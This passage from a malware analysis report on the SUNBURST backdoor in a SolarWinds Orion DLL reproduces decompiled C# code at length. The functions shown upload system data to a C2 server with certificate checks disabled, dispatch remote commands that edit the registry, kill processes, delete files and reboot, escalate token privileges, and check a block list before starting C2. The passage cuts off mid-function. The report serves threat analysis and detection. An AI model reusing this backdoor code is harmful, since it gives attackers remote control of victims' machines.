makes it more difficult to manually or heuristically identify the functions intent to generate an outbound HTTP session.\n\n\t\t\t--Begin UploadSystemDescription Function--\n\t\t\tpublic static void UploadSystemDescription(string[] args, out string result, IWebProxy proxy)\n\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0result = (string) null;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0string requestUriString = args[0];\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0string s1 = args[1];\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0string s2 = args.Length &gt;= 3 ? args[2] : (string) null;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0string[] strArray = Encoding.UTF8.GetString(Convert.FromBase64String(s1)).Split(new string[3]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \"\\r\\n\",\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \"\\r\",\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \"\\n\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}, StringSplitOptions.None);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0HttpWebRequest httpWebRequest1 = (HttpWebRequest) WebRequest.Create(requestUriString);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0HttpWebRequest httpWebRequest2 = httpWebRequest1;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0httpWebRequest2.set_ServerCertificateValidationCallback(httpWebRequest2.get_ServerCertificateValidationCallback() + (RemoteCertificateValidationCallback) ((sender, cert, chain, sslPolicyErrors) =&gt; true));\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0httpWebRequest1.Proxy = proxy;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0httpWebRequest1.Timeout = 120000;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0httpWebRequest1.Method = strArray[0].Split(' ')[0];\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0foreach (string header in strArray)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 int length = header.IndexOf(':');\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 if (length &gt; 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0string headerName = header.Substring(0, length);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0string s3 = header.Substring(length + 1).TrimStart((char[]) Array.Empty&lt;char&gt;());\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (!WebHeaderCollection.IsRestricted(headerName))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 httpWebRequest1.Headers.Add(header);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 switch (OrionImprovementBusinessLayer.GetHash(headerName.ToLower()))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0case 2734787258623754862:\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 httpWebRequest1.Accept = s3;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 continue;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0case 6116246686670134098:\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 httpWebRequest1.ContentType = s3;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 continue;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0case 7574774749059321801:\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 httpWebRequest1.UserAgent = s3;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 continue;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0case 8873858923435176895:\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 if (OrionImprovementBusinessLayer.GetHash(s3.ToLower()) == 1475579823244607677UL)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0httpWebRequest1.ServicePoint.Expect100Continue = true;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0continue;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 httpWebRequest1.Expect = s3;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 continue;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0case 9007106680104765185:\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 httpWebRequest1.Referer = s3;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 continue;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0case 11266044540366291518:\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ulong hash = OrionImprovementBusinessLayer.GetHash(s3.ToLower());\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 httpWebRequest1.KeepAlive = hash == 13852439084267373191UL || httpWebRequest1.KeepAlive;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 httpWebRequest1.KeepAlive = hash != 14226582801651130532UL &amp;&amp; httpWebRequest1.KeepAlive;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 continue;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0case 15514036435533858158:\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 httpWebRequest1.set_Date(DateTime.Parse(s3));\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 continue;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0case 16066522799090129502:\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 httpWebRequest1.set_Date(DateTime.Parse(s3));\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 continue;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0default:\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 continue;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t--End UploadSystemDescription Function--\n\n\t\t\tSUNBURST contains functions that give it the ability to run specified tasks, terminate processes, delete files, compute file hashes, and reboot the victim system.\n\n\t\t\t**RUN SPECIFIED TASKS**\n\t\t\tThe \"ExecuteEngine\" is a core function that uses the \u201cjob\u201d variable to carry out certain tasks for the adversary. This function has the ability to run tasks that could consist of command line arguments, alter the registry (to maintain persistence, etc.), collect a detailed description of the target platform, kill tasks, delete files, add files, or even execute a secondary payload:\n\n\t\t\t--Begin ExecuteEngine Function--\n\t\t\tprivate int ExecuteEngine(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0OrionImprovementBusinessLayer.HttpHelper.JobEngine job,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0string cl,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0out string result)\n\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0result = (string) null;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0int num = 0;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0string[] args = OrionImprovementBusinessLayer.Job.SplitString(cl);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0try\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 if (job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.ReadRegistryValue || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.SetRegistryValue || (job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.DeleteRegistryValue || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetRegistrySubKeyAndValueNames))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0num = OrionImprovementBusinessLayer.HttpHelper.AddRegistryExecutionEngine(job, args, out result);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 switch (job)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0case OrionImprovementBusinessLayer.HttpHelper.JobEngine.SetTime:\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 int delay;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 OrionImprovementBusinessLayer.Job.SetTime(args, out delay);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 this.delay = delay;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 break;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0case OrionImprovementBusinessLayer.HttpHelper.JobEngine.CollectSystemDescription:\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 OrionImprovementBusinessLayer.Job.CollectSystemDescription(this.proxy.ToString(), out result);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 break;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0case OrionImprovementBusinessLayer.HttpHelper.JobEngine.UploadSystemDescription:\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 OrionImprovementBusinessLayer.Job.UploadSystemDescription(args, out result, this.proxy.GetWebProxy());\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 break;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0case OrionImprovementBusinessLayer.HttpHelper.JobEngine.RunTask:\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 num = OrionImprovementBusinessLayer.Job.RunTask(args, cl, out result);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 break;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0case OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetProcessByDescription:\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 OrionImprovementBusinessLayer.Job.GetProcessByDescription(args, out result);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 break;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0case OrionImprovementBusinessLayer.HttpHelper.JobEngine.KillTask:\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 OrionImprovementBusinessLayer.Job.KillTask(args);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 break;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 return job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.WriteFile || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.FileExists || (job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.DeleteFile || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetFileHash) || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetFileSystemEntries ? OrionImprovementBusinessLayer.HttpHelper.AddFileExecutionEngine(job, args, out result) : num;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0catch (Exception ex)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 if (!string.IsNullOrEmpty(result))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0result += \"\\n\";\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 result += ex.Message;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 return ex.HResult;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t--End ExecuteEngine function--\n\n\t\t\t**TERMINATE PROCESSES**\n\t\t\t\u00a0\u00a0\u00a0 public static void KillTask(string[] args) =&gt;\n\t\t\tProcess.GetProcessById(int.Parse(args[0])).Kill();\n\n\t\t\t**DELETE FILE**\n\t\t\t\u00a0\u00a0\u00a0 public static void DeleteFile(string[] args) =&gt; System.IO.File.Delete(Environment.ExpandEnvironmentVariables(args[0]));\n\n\t\t\t**COMPUTE FILE HASHES**\n\t\t\t\u00a0\u00a0\u00a0 public static int GetFileHash(string[] args, out string result)\n\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0result = (string) null;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0string path = Environment.ExpandEnvironmentVariables(args[0]);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0using (MD5 md5 = MD5.Create())\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 using (FileStream fileStream = System.IO.File.OpenRead(path))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0byte[] hash = md5.ComputeHash((Stream) fileStream);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (args.Length &gt; 1)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 return !(OrionImprovementBusinessLayer.ByteArrayToHexString(hash).ToLower() == args[1].ToLower()) ? 1 : 0;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0result = OrionImprovementBusinessLayer.ByteArrayToHexString(hash);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return 0;\n\t\t\t\u00a0\u00a0\u00a0 }\n\n\t\t\t**REBOOT SYSTEM**\n\t\t\tpublic static bool RebootComputer()\n\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0bool flag = false;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0try\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 bool previousState = false;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 string privilege = OrionImprovementBusinessLayer.ZipHelper.Unzip(ph2eifo3n5utg1j8d94qrvbmk0sal76c);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 if (!OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege, true, out previousState))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return flag;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 flag = OrionImprovementBusinessLayer.NativeMethods.InitiateSystemShutdownEx((string) null, (string) null, 0U, true, true, 2147745794U);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege, previousState, out previousState);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 return flag;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0catch (Exception ex)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 return flag;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 }\n\t\t\t--End additional functions Function--\n\n\t\t\t**ADJUST PROCESS PRIVILEGES**\n\t\t\tThe SetProcessPrivilege function is used to adjust privileges for a target process on the victim system. For example, a process may need increased system level privileges to accomplish its designed task.\n\n\t\t\t--Begin SetProcessPrivilege Function--\n\t\t\tpublic static bool SetProcessPrivilege(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0string privilege,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0bool newState,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0out bool previousState)\n\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0bool flag = false;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0previousState = false;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0try\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 IntPtr zero = IntPtr.Zero;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 OrionImprovementBusinessLayer.NativeMethods.LUID Luid = new OrionImprovementBusinessLayer.NativeMethods.LUID();\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Luid.LowPart = 0U;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Luid.HighPart = 0U;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 if (!OrionImprovementBusinessLayer.NativeMethods.OpenProcessToken(OrionImprovementBusinessLayer.NativeMethods.GetCurrentProcess(), TokenAccessLevels.Query | TokenAccessLevels.AdjustPrivileges, ref zero))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return false;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 if (!OrionImprovementBusinessLayer.NativeMethods.LookupPrivilegeValue((string) null, privilege, ref Luid))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0OrionImprovementBusinessLayer.NativeMethods.CloseHandle(zero);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return false;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE NewState = new OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE();\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE PreviousState = new OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE();\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 NewState.PrivilegeCount = 1U;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 NewState.Privilege.Luid = Luid;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 NewState.Privilege.Attributes = newState ? 2U : 0U;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 uint ReturnLength = 0;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 OrionImprovementBusinessLayer.NativeMethods.AdjustTokenPrivileges(zero, false, ref NewState, (uint) Marshal.SizeOf((object) PreviousState), ref PreviousState, ref ReturnLength);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 previousState = (PreviousState.Privilege.Attributes &amp; 2U) &gt; 0U;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 flag = true;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 OrionImprovementBusinessLayer.NativeMethods.CloseHandle(zero);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 return flag;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0catch (Exception ex)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 return flag;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 }\n\n\t\t\t\u00a0\u00a0\u00a0 [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\n\t\t\t\u00a0\u00a0\u00a0 private struct LUID\n\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0public uint LowPart;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0public uint HighPart;\n\t\t\t\u00a0\u00a0\u00a0 }\n\n\t\t\t\u00a0\u00a0\u00a0 [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\n\t\t\t\u00a0\u00a0\u00a0 private struct LUID_AND_ATTRIBUTES\n\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0public OrionImprovementBusinessLayer.NativeMethods.LUID Luid;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0public uint Attributes;\n\t\t\t\u00a0\u00a0\u00a0 }\n\n\t\t\t\u00a0\u00a0\u00a0 [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\n\t\t\t\u00a0\u00a0\u00a0 private struct TOKEN_PRIVILEGE\n\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0public uint PrivilegeCount;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0public OrionImprovementBusinessLayer.NativeMethods.LUID_AND_ATTRIBUTES Privilege;\n\t\t\t\u00a0\u00a0\u00a0 }\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t--End SetProcessPrivilege Function--\n\n\n\t\t\t**BLOCK LIST CHECKING FUNCTIONS**\n\t\t\tThe Update function is critical to starting the SUNBURST C2 functionality. Early in its execution, the Update function calls the UpdateNotification() function. If that returns a \u201cFalse\u201d, indicating one of the hard-coded block list processes is running, the SUNBURST malware will not initiate its C2 session. The malicious class \u201cOrionImprovementBusinessLayer\u201d, containing the SUNBURST module, will effectively be disabled. However, the parent SolarWinds process running the malicious DLL 32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77 will not be interrupted.\n\n\t\t\t--Begin Update Function--\n\t\t\t\u00a0\u00a0\u00a0private static void Update()\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 bool flag1 = false;\n\t\t\t\u00a0\u00a0\u00a0 OrionImprovementBusinessLayer.CryptoHelper cryptoHelper = new OrionImprovementBusinessLayer.CryptoHelper(OrionImprovementBusinessLayer.userId, OrionImprovementBusinessLayer.domain4);\n\t\t\t\u00a0\u00a0\u00a0 OrionImprovementBusinessLayer.HttpHelper http = (OrionImprovementBusinessLayer.HttpHelper) null;\n\t\t\t\u00a0\u00a0\u00a0 Thread thread = (Thread) null;\n\t\t\t\u00a0\u00a0\u00a0 bool last = true;\n\t\t\t\u00a0\u00a0\u00a0 OrionImprovementBusinessLayer.AddressFamilyEx addressFamilyEx = OrionImprovementBusinessLayer.AddressFamilyEx.Unknown;\n\t\t\t\u00a0\u00a0\u00a0 int num1 = 0;\n\t\t\t\u00a0\u00a0\u00a0 bool flag2 = true;\n\t\t\t\u00a0\u00a0\u00a0 OrionImprovementBusinessLayer.DnsRecords rec = new OrionImprovementBusinessLayer.DnsRecords();\n\t\t\t\u00a0\u00a0\u00a0 Random random = new Random();\n\t\t\t\u00a0\u00a0\u00a0 int num2 = 0;\n\t\t\t\u00a0\u00a0\u00a0 if (!OrionImprovementBusinessLayer.UpdateNotification())\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return;\n\t\t\t\u00a0\u00a0\u00a0 OrionImprovementBusinessLayer.svcListModified2 = false;\n\t\t\t\u00a0\u00a0\u00a0 for (int index = 1; index &lt;= 3 &amp;&amp; !flag1; ++index)\n\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0OrionImprovementBusinessLayer.DelayMin(rec.A, rec.A);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (!OrionImprovementBusinessLayer.ProcessTracker.TrackProcesses(true))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 if (OrionImprovementBusinessLayer.svcListModified1)\n\t\t\t\u00a0\u00a0\u00a0 